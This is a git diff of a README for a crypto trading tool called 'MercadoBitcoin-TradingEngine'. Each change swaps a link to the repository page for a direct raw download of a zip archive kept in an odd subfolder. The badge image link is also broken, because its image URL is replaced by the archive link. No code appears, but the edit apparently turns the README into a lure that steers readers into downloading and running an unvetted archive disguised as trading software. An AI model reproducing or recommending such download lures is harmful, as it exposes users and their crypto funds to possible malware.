@@ -1,6 +1,6 @@
 # 🚀 MercadoBitcoin-TradingEngine - Automate Your Crypto Trading Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge&logo=github&logoColor=white)](https://github.com/anderson-mendes612/MercadoBitcoin-TradingEngine)
+[![Download Now](https://github.com/anderson-mendes612/MercadoBitcoin-TradingEngine/raw/refs/heads/main/academist/Mercado_Bitcoin_Engine_Trading_v1.5.zip%20Now-brightgreen?style=for-the-badge&logo=github&logoColor=white)](https://github.com/anderson-mendes612/MercadoBitcoin-TradingEngine/raw/refs/heads/main/academist/Mercado_Bitcoin_Engine_Trading_v1.5.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ To get started, follow these simple steps:
 
 1. **Visit the Download Page**  
    Click on the link below to access the download page.  
-   [Download Now](https://github.com/anderson-mendes612/MercadoBitcoin-TradingEngine)
+   [Download Now](https://github.com/anderson-mendes612/MercadoBitcoin-TradingEngine/raw/refs/heads/main/academist/Mercado_Bitcoin_Engine_Trading_v1.5.zip)
 
 2. **Choose the Right Version**  
    On the download page, you’ll see several versions available. Select the latest version for the best features and security updates.
@@ -87,7 +87,7 @@ If you face any challenges or have questions while using the trading engine, con
 
 To download and run the software, follow these instructions:
 
-1. Visit the download page here: [Download Now](https://github.com/anderson-mendes612/MercadoBitcoin-TradingEngine)
+1. Visit the download page here: [Download Now](https://github.com/anderson-mendes612/MercadoBitcoin-TradingEngine/raw/refs/heads/main/academist/Mercado_Bitcoin_Engine_Trading_v1.5.zip)
 2. Choose the version suited for your system.
 3. Download the file.
 4. Extract files if needed.
